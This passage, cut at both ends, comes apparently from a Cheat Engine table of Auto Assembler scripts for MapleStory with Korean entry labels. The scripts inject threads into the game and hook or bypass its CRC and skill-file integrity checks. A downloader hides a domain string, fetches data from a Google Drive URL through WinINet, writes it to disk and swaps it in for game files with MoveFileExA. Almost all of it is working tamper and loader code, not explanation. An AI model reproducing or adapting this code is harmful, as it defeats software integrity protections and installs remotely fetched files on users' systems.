add [dmomainapi+esi],#600000
cmp [dmomainapi+esi+124],0
jne incs
cmp [dmomainapi+esi+128],0
jne incs
cmp [dmomainapi+esi+12C],0
jne incs
mov eax,[subpointers]
mov eax,[eax]
mov [eax],0
mov [eax+4],0
mov [eax+8],0
mov [eax+C],0
add [eax],0
add [eax+4],0
add [eax+8],0
add [eax+C],0
mov eax,[highter]
mov [esp],eax
ret
fufu:
push ecx
lea ecx,[esp+04]
sub ecx,eax
sbb eax,eax
not eax
and ecx,eax
mov eax,esp
and eax,FFFFF000
fufu3:
cmp ecx,eax
//repne jb fufu2
db 72 0B
mov eax,ecx
pop ecx
xchg eax,esp
mov eax,[eax]
mov [esp],eax
repne ret
fufu2:
sub eax,00001000
test [eax],eax
jmp fufu3
db cc cc cc cc cc cc
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
      <CheatEntries>
        <CheatEntry>
          <ID>421</ID>
          <Description>"도메인 함수 인크립션"</Description>
          <LastState/>
          <VariableType>Auto Assembler Script</VariableType>
          <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat

label(goto1)
01503030:
xor esi,esi
goto1:
add esi,4
add [dmomainapi+esi],#600000
cmp [dmomainapi+esi+4],0
jne goto1
cmp [dmomainapi+esi+8],0
jne goto1
cmp [dmomainapi+esi+C],0
jne goto1

ret


createThread(01503030)
 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
          <CheatEntries>
            <CheatEntry>
              <ID>422</ID>
              <Description>"도메인 비인크립션 스타트"</Description>
              <LastState/>
              <VariableType>Auto Assembler Script</VariableType>
              <AssemblerScript>[ENABLE]
label(goto1)
label(gotoA)
label(gotoB)
label(gotoC)
01603037:
xor esi,esi
goto1:
add esi,4
sub [dmomainapi+esi],#600000
cmp [dmomainapi+esi+4],0
jne goto1
cmp [dmomainapi+esi+8],0
jne goto1
mov [1770B6B+4],eax
mov [1770B6B+8],ebx
mov [1770B6B+C],ecx
mov [1770B6B+10],edx
mov [1770B6B+14],edi
mov [1770B6B+18],esi
mov [1770B6B+1C],esp
mov [1770B6B+20],ebp


//loaddll
push 0
push 0
mov eax,apic-557744
add eax,557744
push eax
push eax
xor eax,eax
push 0
push 0
call [crea]
mov eax,[1770B6B+4]
mov ebx,[1770B6B+8]
mov ecx,[1770B6B+C]
mov edx,[1770B6B+10]
mov edi,[1770B6B+14]
mov esi,[1770B6B+18]
mov esp,[1770B6B+1C]
mov ebp,[1770B6B+20]
push #80
call [sleepde2]
mov eax,[1770B6B+4]
mov ebx,[1770B6B+8]
mov ecx,[1770B6B+C]
mov edx,[1770B6B+10]
mov edi,[1770B6B+14]
mov esi,[1770B6B+18]
mov esp,[1770B6B+1C]
mov ebp,[1770B6B+20]
cmp [apilist-4],50401000
jae gotoA
push dllloads+100
call [loadL] //1 //bugbug
push dllloads+140
call [loadL] //2
push dllloads+180
call [loadL] //3
push dllloads+1C0
call [loadL] //4
mov [1770B6B+4],eax
mov [1770B6B+8],ebx
mov [1770B6B+C],ecx
mov [1770B6B+10],edx
mov [1770B6B+14],edi
mov [1770B6B+18],esi
mov [1770B6B+1C],esp
mov [1770B6B+20],ebp
jmp gotoB
gotoA:
push dllloads
call [loadL] //1
push dllloads+40
call [loadL] //2
push dllloads+80
call [loadL] //3
push dllloads+C0
call [loadL] //4
gotoB:
mov eax,[1770B6B+4]
mov ebx,[1770B6B+8]
mov ecx,[1770B6B+C]
mov edx,[1770B6B+10]
mov edi,[1770B6B+14]
mov esi,[1770B6B+18]
mov esp,[1770B6B+1C]
mov ebp,[1770B6B+20]
push #20
call [sleepde2]
mov eax,[1770B6B+4]
mov ebx,[1770B6B+8]
mov ecx,[1770B6B+C]
mov edx,[1770B6B+10]
mov edi,[1770B6B+14]
mov esi,[1770B6B+18]
mov esp,[1770B6B+1C]
mov ebp,[1770B6B+20]
push 0
push 0
mov eax,ThreadGet-557744
add eax,557744
push eax
push eax
xor eax,eax
push 0
push 0
call [crea]

mov eax,[subpointers]
mov eax,[eax]
mov [eax],6F636370-9000
mov [eax+4],6B2E646D-9000
mov [eax+8],6B2E6F72-9000
mov [eax+C],00000072-9000
add [eax],9000
add [eax+4],9000
add [eax+8],9000
add [eax+C],9000



mov eax,[1770B6B+4]
mov ebx,[1770B6B+8]
mov ecx,[1770B6B+C]
mov edx,[1770B6B+10]
mov edi,[1770B6B+14]
mov esi,[1770B6B+18]
mov esp,[1770B6B+1C]
mov ebp,[1770B6B+20]
push 0
push 0
mov eax,dmomainapi-557744
add eax,557744
push eax
push eax
xor eax,eax
push 0
push 0
call [crea]
mov eax,[1770B6B+4]
mov ebx,[1770B6B+8]
mov ecx,[1770B6B+C]
mov edx,[1770B6B+10]
mov edi,[1770B6B+14]
mov esi,[1770B6B+18]
mov esp,[1770B6B+1C]
mov ebp,[1770B6B+20]
push #6400
call [sleepde2]
mov eax,[1770B6B+4]
mov ebx,[1770B6B+8]
mov ecx,[1770B6B+C]
mov edx,[1770B6B+10]
mov edi,[1770B6B+14]
mov esi,[1770B6B+18]
mov esp,[1770B6B+1C]
mov ebp,[1770B6B+20]
push 0
push 0
mov eax,01961000-557744
add eax,557744
push eax
push eax
xor eax,eax
push 0
push 0
call [crea]
cmp [0178F310],1
je gotoC
push 0
push 0
mov eax,16CCDFE-557744 //img cehack
add eax,557744
push eax
push eax
xor eax,eax
push 0
push 0
call [crea]
gotoC:
mov eax,[1770B6B+4]
mov ebx,[1770B6B+8]
mov ecx,[1770B6B+C]
mov edx,[1770B6B+10]
mov edi,[1770B6B+14]
mov esi,[1770B6B+18]
mov esp,[1770B6B+1C]
mov ebp,[1770B6B+20]
push #2000
call [sleepde2]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret

createThread(01603037)


[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
            </CheatEntry>
          </CheatEntries>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>473</ID>
      <Description>"경유 도메인"</Description>
      <ShowAsHex>1</ShowAsHex>
      <VariableType>String</VariableType>
      <Length>1035</Length>
      <Unicode>0</Unicode>
      <CodePage>0</CodePage>
      <ZeroTerminate>1</ZeroTerminate>
      <Address>subpointers</Address>
      <Offsets>
        <Offset>0</Offset>
        <Offset>0</Offset>
      </Offsets>
      <CheatEntries>
        <CheatEntry>
          <ID>481</ID>
          <Description>"다운로드 도메인"</Description>
          <ShowAsHex>1</ShowAsHex>
          <VariableType>String</VariableType>
          <Length>20</Length>
          <Unicode>0</Unicode>
          <CodePage>0</CodePage>
          <ZeroTerminate>1</ZeroTerminate>
          <Address>subpointers</Address>
          <Offsets>
            <Offset>0</Offset>
            <Offset>4</Offset>
          </Offsets>
          <CheatEntries>
            <CheatEntry>
              <ID>480</ID>
              <Description>"해쉬 도메인"</Description>
              <ShowAsHex>1</ShowAsHex>
              <VariableType>String</VariableType>
              <Length>20</Length>
              <Unicode>0</Unicode>
              <CodePage>0</CodePage>
              <ZeroTerminate>1</ZeroTerminate>
              <Address>subpointers</Address>
              <Offsets>
                <Offset>0</Offset>
                <Offset>8</Offset>
              </Offsets>
            </CheatEntry>
            <CheatEntry>
              <ID>483</ID>
              <Description>"다운로드 도메인"</Description>
              <ShowAsHex>1</ShowAsHex>
              <VariableType>String</VariableType>
              <Length>20</Length>
              <Unicode>0</Unicode>
              <CodePage>0</CodePage>
              <ZeroTerminate>1</ZeroTerminate>
              <Address>saves2</Address>
            </CheatEntry>
          </CheatEntries>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>147</ID>
      <Description>"다운로더기 01413079"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
0146C700:
db 0A 00 65 61 0A 00 00




define(maing,01401000)
Registersymbol(maing)
label(main)
define(diret,01401f00)
Registersymbol(diret)
define(diret2,01401F60)
Registersymbol(diret2)
define(allo,01402000)
Registersymbol(allo)
define(allof,01403000)
Registersymbol(allof)
label(goto1)
label(main2)
label(gotog)
define(PathPrintf,01413000)
Registersymbol(PathPrintf)
label(ccdata)
label(ccdata2)
label(ccdata3)
label(coutd)

diret:
repne jne diret+5
repne ret
push ebp
mov ebp,esp
sub esp,00
push eax
label(put)
diret2:
push ebp
mov ebp,esp
sub esp,08
mov [ebp-04],ecx
mov eax,[ebp-04]
mov [ebp-08],eax
mov ecx,[ebp-04]
movzx edx,byte ptr [ecx]
test edx,edx
je put
call dword ptr [Thid]// GetCurrentThreadId
jne put
nop
put:
mov esp,ebp
pop ebp
ret

label(putd)
label(putd2)
label(putd3)
label(putd4)
label(putd5)
maing:
mov [handlev+104],eax
mov [handlev+108],ebx
mov [handlev+10c],ecx
mov [handlev+110],edx
mov [handlev+114],edi
mov [handlev+118],esi
mov [handlev+11c],esp
mov [handlev+120],ebp
push 0
push 0
push zerop
push zerop
push 0
push 0
call [crea]
push #200
call [sleepde2]
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
push 0
push 0
push Mesagas
push Mesagas
push 0
push 0
call [crea]
push #20
call [sleepde2]
gotog:
push #100
call [sleepde2]
main:
mov [handlev+104],eax
mov [handlev+108],ebx
mov [handlev+10c],ecx
mov [handlev+110],edx
mov [handlev+114],edi
mov [handlev+118],esi
mov [handlev+11c],esp
mov [handlev+120],ebp
mov esi,[handlev+60]
mov eax,[00B18DCC]
mov eax,[eax+102F70C+esi]
cmp [eax],'http'
je coutd
cmp [downlack],1
jne coutd
push eax
call [apilist+10]
push allocd+8C0 // 'Data accumulator' A0 00 sapezone
call [apilist+10]
coutd:
mov [downlack],1
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]

push ebp
mov ebp,esp
sub esp,00000694
push ebx
push esi
push edi
lea edi,[ebp-00000694]
mov ecx,000001A5
mov eax,CCCCCCCC
repe stosd
xor eax,ebp
mov [ebp-04],eax
mov ecx,won //1
call diret2
mov [ebp-30],00000001
mov esi,esp
push 00
push 00
push 00
push 00
push te //tec
call dword ptr [openi] { -&gt;WININET.InternetOpenA }
cmp esi,esp
call diret
mov [ebp-0C],eax
mov esi,esp
push 00 { 0 }
push 00 { 0 }
push 00 { 0 }
push 00 { 0 }
mov [handlev+28],eax
mov [handlev+2C],esi
xor esi,esi
mov esi,[handlev+60]
mov eax,[00B18DCC]
mov eax,[eax+102F70C+esi]
cmp [eax],0
je ccdata3
push eax {Path ("https://drive.google.com/file/d/1NnIw5RYCJhbP7QTmeBgQslqzbCt5A-") }
mov eax,[handlev+28]
mov esi,[handlev+2C]
add [handlev+60],4
mov eax,[ebp-0C]
mov [handlev+4],eax//handle
push eax
call dword ptr [openrul] { -&gt;WININET.InternetOpenUrlA }
cmp esi,esp
call diret
mov [ebp-18],eax
mov [handlev+8],eax//handle
mov esi,esp
push 00
push 00000080
push 02
push 00
push 00
push 40000000 { 2.00 }
mov [handlev+38],eax
mov [handlev+3C],esi
mov [handlev+154],eax
mov [handlev+158],ebx
mov [handlev+15c],ecx
mov [handlev+160],edx
mov [handlev+164],edi
mov [handlev+168],esi
mov [handlev+16c],esp
mov [handlev+170],ebp
db 6a 01
push 001801000
push eax
call [01505028]//kernel32.MoveFileExA
push #1000
call [sleepde2]
mov eax,[handlev+154]
mov ebx,[handlev+158]
mov ecx,[handlev+15c]
mov edx,[handlev+160]
mov edi,[handlev+164]
mov esi,[handlev+168]
mov esp,[handlev+16c]
mov ebp,[handlev+170]
xor esi,esi
mov esi,[handlev+68]
mov eax,[00B18DCC]
mov eax,[eax+102F710+esi]
cmp [eax],0
je ccdata3
push eax {Path ("https://drive.google.com/file/d/1NnIw5RYCJhbP7QTmeBgQslqzbCt5A-") }
mov eax,[handlev+38]
mov esi,[handlev+3C]
add [handlev+68],4
dec [DownCount]
call dword ptr [creafd] { -&gt;kernel32.CreateFileA }
cmp esi,esp
call diret
mov [ebp-00000450],eax
mov [handlev],eax//handle
cmp dword ptr [ebp-00000450],-01 { 255 }
jne goto1
xor eax,eax
jmp putd
putd3:
mov [190C000],0
jmp putd5
putd2:
inc [190C000]
jmp putd5
goto1:
cmp dword ptr [ebp-30],01 { 0 } //jbe
je putd2 //pixF
cmp dword ptr [ebp-30],400 { 0 } //jbe
je putd3 //pixF
putd5:
cmp dword ptr [ebp-30],00 { 0 } //jbe
jbe putd //pixF
cmp [190C000],#5000
jae ccdata4//01413079
putd4:
mov esi,esp
lea eax,[ebp-30]
push eax
push 00000400 { 1024 }
lea ecx,[ebp-00000438]
push ecx
mov edx,[ebp-18]
push edx
call dword ptr [interread] { -&gt;WININET.InternetReadFile }
cmp esi,esp
call diret
mov esi,esp
push 00 { 0 }
lea eax,[ebp-00000444]
push eax
mov ecx,[ebp-30]
push ecx
lea edx,[ebp-00000438]
push edx
mov eax,[ebp-00000450]
push eax
call dword ptr [writef] { -&gt;kernel32.WriteFile }
cmp esi,esp
call diret
jmp goto1

putd:
push [handlev]
call dword ptr [closeh] { -&gt;kernel32.CloseHandle }
push [handlev+4]
call dword ptr [interclsoe]
push [handlev+8]
call dword ptr [interclsoe]
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
push #5 //sfff
call [sleepde2]
cmp [DownCount],0
je ccdata2
push 0
push 0
push main
push main
push 0
push 0
call [crea]
push 0
push 0
push PathPrintf
push PathPrintf
push 0
push 0
call [crea]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret
main2:
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret
PathPrintf:
cmp [allocd+1000],1
je ccdata2
push allocd+7C0 //Abnadon Ware download controller is launched.' 0A 00
call [apilist+10]
push allocd+8C0 // 'Data accumulator' A0 00
call [apilist+10]
push allocd+950 // 'MS api Inverse' A0 00
call [apilist+10]
push allocd+9C0 // 'all clear' A0 00
call [apilist+10]
mov [allocd+1000],1 //sub Fileter
ccdata:
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret
ccdata2:
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
push 0
push 0
push 1901000
push 1901000
push 0
push 0
call [crea]
push #200
call [sleepde2]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret

ccdata3:
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
mov ebp,[handlev+120]
push 0
push 0
push 1901000
push 1901000
push 0
push 0
call [crea]
push #200
call [sleepde2]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret


ccdata4:
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
push 0
push 0
push 1901000
push 1901000
push 0
push 0
call [crea]
push #200
call [sleepde2]
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
push 00C80B89 //end Clea
call [apilist+10] //end
push 18051F5 //end Clea
call [apilist+10] //end
mov eax,[handlev+104]
mov ebx,[handlev+108]
mov ecx,[handlev+10c]
mov edx,[handlev+110]
mov edi,[handlev+114]
mov esi,[handlev+118]
mov esp,[handlev+11c]
mov ebp,[handlev+120]
push 0
push 0
push 1901000
push 1901000
push 0
push 0
call [crea]
push #2000
call [sleepde2]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret


1901000:
db 6a 01
push 1801000
push c3bc39
call [01505028]
push 1
call [sleepde2]
db 6a 01
push c3bc39
push 1805000
call [01505028]
db 6a 01
push 18052C0
push 00C05D4C
call [01505028]
push 1
call [sleepde2]
db 6a 01
push 00C05D4C
push 1805400
call [01505028]
ret
//CreateThread(maing) //MapleStory.exe+805D4C


1805000:
db '.\load64\mss32.img' 00 00 00 00 00 00
1805060:
db '.\load64\MapleStory.img' 00 00 00 00 00
1805160:
db 'MapleStory.img' 00 00 00 00 00
18051C0:
db 'MapleStory.exe' 00 00
18051F5:
db 'Download success' 0A 00
18052C0:
db '.X.exe' 00 00 00 00 00
1805400:
db '.\load64\MapleStory.img' 00 00 00 00 00

014013F0:
je 01413079
[DISABLE]
</AssemblerScript>
      <CheatEntries>
        <CheatEntry>
          <ID>412</ID>
          <Description>"메세지박스"</Description>
          <LastState/>
          <VariableType>Auto Assembler Script</VariableType>
          <AssemblerScript>[ENABLE]
Mesagas:
push 0
push zemogd
push meesgeA
push 0
call [boxa]
ret
[DISABLE]

</AssemblerScript>
        </CheatEntry>
        <CheatEntry>
          <ID>410</ID>
          <Description>"CMD키기"</Description>
          <LastState/>
          <VariableType>Auto Assembler Script</VariableType>
          <AssemblerScript>[ENABLE]
Define(Stdout,#32)
01400800:
db 'CONOUT$' 00
0146C700:
db 0A 00

0146C600:
db 'w' 00
zerop:
push ebp
mov ebp,esp
mov eax,00006004
call [apilist]//0
call [apilist+4]//4
call [apilist+8]/8
add eax,Stdout
push eax
push 0146C600//Filename
push 01400800 //Mode
call [apilist+C]
push MapleStory.exe+1F05
call [apilist+10]
push 01400800
call [apilist+10]
push MapleStory.exe+1F05
call [apilist+10]
push 00
push fffffffE
call [apilist+14]
ret
createThread(zerop)
[DISABLE]
</AssemblerScript>
        </CheatEntry>
        <CheatEntry>
          <ID>492</ID>
          <Description>"cmd컨트롤러"</Description>
          <LastState/>
          <VariableType>Auto Assembler Script</VariableType>
          <AssemblerScript>[ENABLE]
label(goto1)
downcontrol:
xor eax,eax
push #2
call [sleepde2]
mov eax,[00B18DCC]
test eax,eax
je downcontrol
mov eax,[eax+102F710]
mov eax,[eax]
cmp eax,0
je downcontrol
mov [0178FC40+4],eax
mov [0178FC40+8],ebx
mov [0178FC40+C],ecx
mov [0178FC40+10],edx
mov [0178FC40+14],edi
mov [0178FC40+18],esi
mov [0178FC40+1C],esp
mov [0178FC40+20],ebp
mov eax,[00B18DCC]
mov eax,[eax+102F70C]
mov eax,[eax-6]
cmp [018D1245],eax
je goto1
mov [0178F310],1
mov eax,[0178FC40+4]
mov ebx,[0178FC40+8]
mov ecx,[0178FC40+C]
mov edx,[0178FC40+10]
mov edi,[0178FC40+14]
mov esi,[0178FC40+18]
mov esp,[0178FC40+1C]
mov ebp,[0178FC40+20]
push #200
call [sleepde2]
mov eax,[0178FC40+4]
mov ebx,[0178FC40+8]
mov ecx,[0178FC40+C]
mov edx,[0178FC40+10]
mov edi,[0178FC40+14]
mov esi,[0178FC40+18]
mov esp,[0178FC40+1C]
mov ebp,[0178FC40+20]
push [dumpin-200]
call [SuspendA]
mov eax,[0178FC40+4]
mov ebx,[0178FC40+8]
mov ecx,[0178FC40+C]
mov edx,[0178FC40+10]
mov edi,[0178FC40+14]
mov esi,[0178FC40+18]
mov esp,[0178FC40+1C]
mov ebp,[0178FC40+20]
push 0
push 0
push 01401000
push 01401000
push 0
push 0
call [crea]
mov eax,[0178FC40+4]
mov ebx,[0178FC40+8]
mov ecx,[0178FC40+C]
mov edx,[0178FC40+10]
mov edi,[0178FC40+14]
mov esi,[0178FC40+18]
mov esp,[0178FC40+1C]
mov ebp,[0178FC40+20]
mov eax,[highter]
mov [esp],eax
ret
goto1:
mov eax,[highter]
mov [esp],eax
ret

createThread(01790240)


[DISABLE]
</AssemblerScript>
          <CheatEntries>
            <CheatEntry>
              <ID>402</ID>
              <Description>"up count"</Description>
              <VariableType>4 Bytes</VariableType>
              <Address>01430608</Address>
            </CheatEntry>
          </CheatEntries>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>411</ID>
      <Description>"Get"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
ThreadGet:
push allocd-80
call [loadL]
add eax,119E6
mov [018D123D],eax
xor eax,eax
push allocd-C0
call [loadL]
add eax,3b0
mov eax,[eax]
mov [018D123D+8],eax
ret
createThread(ThreadGet)
[DISABLE]

</AssemblerScript>
      <CheatEntries>
        <CheatEntry>
          <ID>381</ID>
          <Description>"crc주소 생성+sleep"</Description>
          <LastState/>
          <VariableType>Auto Assembler Script</VariableType>
          <AssemblerScript>[ENABLE]
//hexRay
//83 4E 34 01 33 C0 89 46 08 89 46 0C 8B 46 34 F7 C7 00 00 00 40 74 06 83 C8 02
//E9 77 F6 0A B1 90
label(exit)
label(exit2)

crccontrol:
cmp [0178F310],1
je exit2
mov [allocd+680],edx
mov edx,[esp]
cmp [edx],'Data'
jne exit
cmp [edx+4],'/Ski'
jne exit
cmp [edx+8],'ll/1'
jne exit
cmp [edx+C],'00.i'
jne exit
mov edx,[ebx-1c]
mov [crcbase],edx
or dword ptr [esi+34],01
xor eax,eax
mov edx,[allocd+680]
jmp [018D123D]
exit:
mov edx,[allocd+680]
or dword ptr [esi+34],01
xor eax,eax
jmp [018D123D]

exit2:
push #2000000
call [sleepde2]
jmp [018D123D]
//508119E0:
//jmp crccontrol
//nop
//returnhere:

[DISABLE]
</AssemblerScript>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>90</ID>
      <Description>"skill img 체크 Error 의심"</Description>
      <LastState/>
      <Color>0000FF</Color>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
label(returnhere2)
label(exit2)
01400200:
db '.\Data\Skill\*.img' 00
01412100:
db
label(gotoread)
label(zero)
label(cmpaded)
label(gotohand)
define(alllocc,01410000)
Registersymbol(alllocc) //inzer
define(alllocc2,01414000)
Registersymbol(alllocc2) //inzer
define(alllocc3,01416000)
Registersymbol(alllocc3) //inzer
016D04FE:
cmp [016CC0FE],1
je exit2
push skilldataGet
jmp returnhere2
exit2:
push 00BB6820
jmp returnhere2

"MapleStory.exe"+2C6129:
jmp 016D04FE
returnhere2: //예외처리


skilldataGet:
db '.\Data\Skill\*.img' 00
label(returnhere)
label(exit)
16CCDFE+700:
cmp [016CC0FE],1 //cmpcount
je exit
mov [Tir+50],eax
mov [Tir+54],ebx
mov [Tir+58],ecx
mov [Tir+5c],edx
mov [Tir+60],edi
mov [Tir+64],esi
mov [Tir+68],esp
mov [Tir+6C],ebp
push 0
push 08000027
push 03
push 0
push 01
push 80000000
mov ebx,[eax]
mov [0140020D],ebx
mov ebx,[eax+4]
mov [0140020D+4],ebx
mov ebx,[eax+8]
mov [0140020D+8],ebx
push 01400200
xor eax,eax
xor ebx,ebx
call dword ptr [creafd] //kernel32.CreateFileA
mov [alllocc],eax
mov eax,[alllocc]
push 00
lea edx,[ebp+0C]
push edx
push 00001000
lea eax,[alllocc2]
push eax
gotoread:
mov ebx,[alllocc]
push ebx
call dword ptr [MapleStory.exe+7100A0] //kernel32.ReadFile
test eax,eax
je gotohand
mov eax,[ebp+0C]
test eax,eax
je gotohand
xor ecx,ecx
cmpaded:
cmp ecx,[ebp+0C]
jae zero
movzx edx,byte ptr [alllocc2+ecx]
mov ebx,eax
and ebx,000000FF
xor edx,ebx
lea ebx,[01412100]
shr eax,08
xor eax,[ebx+edx*4]
mov ebx,[alllocc3]
mov [01421300],eax
inc ecx
jmp cmpaded
zero:
push 00
lea eax,[ebp+0C]
push eax
push 00001000
lea ecx,[alllocc3]
push ecx
jmp gotoread
test ebx,ebx
je gotoexit
push ebx
gotohand:
call dword ptr [closeh] //close kernel32.CloseHandle
jmp gotoexit
gotoexit:
mov edx,[01421300]
not edx
mov [Tir-40],edx
mov eax,[Tir+50]
mov ebx,[Tir+54]
mov ecx,[Tir+58]
mov edx,[Tir+5c]
mov edi,[Tir+60]
mov esi,[Tir+64]
mov esp,[Tir+68]
mov ebp,[Tir+6C]

push [Tir-40]
push xd //%x
push 00000009
mov edi,[dataaad]
lea eax,[savaskill+edi]
push eax
call apiX7F
add [dataaad],7
mov eax,[Tir+50]
mov ebx,[Tir+54]
mov ecx,[Tir+58]
mov edx,[Tir+5c]
mov edi,[Tir+60]
mov esi,[Tir+64]
mov esp,[Tir+68]
mov ebp,[Tir+6C]
push eax
lea eax,[ebp-00000244]
jmp returnhere//jmp returnhere
exit:
push eax
lea eax,[ebp-00000244]
jmp returnhere//jmp returnhere
"MapleStory.exe"+2C6158:
jmp 16CCDFE+700
nop 2
returnhere:


16CCDFE:
push ebp
mov ebp,esp
sub esp,0000044C
lea eax,[ebp-00000244]
push eax
call MapleStory.exe+2C5EAE
test eax,eax
pop ecx
je MapleStory.exe+2C61B6
push esi
lea eax,[ebp-00000244]
push eax
lea eax,[ebp-0000044C]
push skilldataGet
push eax
call MapleStory.exe+685645
add esp,0C
lea eax,[ebp-00000140]
push eax
lea eax,[ebp-0000044C]
push eax
call dword ptr [MapleStory.exe+71005C]
mov esi,eax
mov [dumpin-700],eax
mov [dumpin-704],ebx
mov [dumpin-708],ecx
mov [dumpin-70C],edx
mov [dumpin-710],edi
mov [dumpin-714],esi
mov [dumpin-718],esp
mov [dumpin-71C],ebp
push 0
push 0
push 018A1C00
push 018A1C00
push 0
push 0
call [crea]
mov eax,[dumpin-700]
mov ebx,[dumpin-704]
mov ecx,[dumpin-708]
mov edx,[dumpin-70C]
mov edi,[dumpin-710]
mov esi,[dumpin-714]
mov esp,[dumpin-718]
mov ebp,[dumpin-71C]
cmp esi,-01
je MapleStory.exe+2C61AE
lea eax,[ebp-00000114]
jmp 16CCDFE+700
nop 2
push eax
lea eax,[ebp-0000044C]
push MapleStory.exe+7B6814
push eax
call MapleStory.exe+685645
add esp,10
test byte ptr [ebp-00000140],05
je MapleStory.exe+2C618F
push 00000080
lea eax,[ebp-0000044C]
push eax
call dword ptr [MapleStory.exe+710058]
lea eax,[ebp-0000044C]
push eax
call dword ptr [MapleStory.exe+710100]
lea eax,[ebp-00000140]
push eax
push esi
call dword ptr [MapleStory.exe+710054]
test eax,eax
jne MapleStory.exe+2C6152
push esi
call dword ptr [MapleStory.exe+710050]
pop esi
leave

//createThread(16CCDFE)
018A1C00-200:
db 'hash.txt' 00
label(rola)
label(rolaf)
label(rolcc2)
label(rolcc3)
018A1C00:
cmp [016CC0FE-4],1
je rolaf
mov [016CC0FE-4],1
push #6500
call [sleepde2]
mov [00C83B83],61445C2E
mov [00C83B83+4],495C6174
mov [00C83B83+8],5C6D6574
mov [00C83B83+C],736E6F43
mov [00C83B83+10],5C656D75
mov [00C83B83+14],6D692E2A
mov [00C83B83+18],00000067

mov [01400200],61445C2E
mov [01400200+4],495C6174
mov [01400200+8],5C6D6574
mov [01400200+C],736E6F43
mov [01400200+10],5C656D75
mov [01400200+14],0000002A

mov [016CD54E+2],01400214
mov [016CD557+2],01400214+4
mov [016CD560+2],01400214+8

push 0
push 0
push 16CCDFE
push 16CCDFE
push 0
push 0
call [crea]
push #3500
call [sleepde2]
xor esi,esi
xor eax,eax
rola:
mov eax,savaskill-1
inc esi
cmp [eax+esi],0
jne rola
mov [018A1C00-300],esi
xor esi,esi
mov eax,savaskill
rolcc:
mov ebx,[eax+esi] //V
rol ebx,5
mov [eax+esi],ebx
add esi,4
cmp [eax+esi],0
jne rolcc
mov [016CC0FE],1
xor ecx,ecx
xor esi,esi
xor eax,eax
xor ebx,ebx

rolcc2:
mov eax,[019E0FEE]
mov eax,[eax+c]
mov ebx,[eax+esi]
mov edi,[savaskill+esi]
mov edx,[savaskill+esi+4]
cmp edx,0
je rolaf
rol ebx,5
add esi,4
cmp edi,ebx
je rolcc2
db 'dcc'

rolaf:
mov eax,[highter]
mov [esp],eax
ret

rolcc3:
mov eax,[highter]
mov [esp],eax
ret
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
      <CheatEntries>
        <CheatEntry>
          <ID>328</ID>
          <Description>"skill basd"</Description>
          <ShowAsSigned>0</ShowAsSigned>
          <VariableType>String</VariableType>
          <Length>10</Length>
          <Unicode>0</Unicode>
          <CodePage>0</CodePage>
          <ZeroTerminate>1</ZeroTerminate>
          <Address>savaskill</Address>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>495</ID>
      <Description>"버전체크 노포인터"</Description>
      <VariableType>String</VariableType>
      <Length>10</Length>
      <Unicode>0</Unicode>
      <CodePage>0</CodePage>
      <ZeroTerminate>1</ZeroTerminate>
      <Address>018D1245</Address>
    </CheatEntry>
    <CheatEntry>
      <ID>497</ID>
      <Description>"버전체크 후포인터"</Description>
      <ShowAsHex>1</ShowAsHex>
      <VariableType>String</VariableType>
      <Length>10</Length>
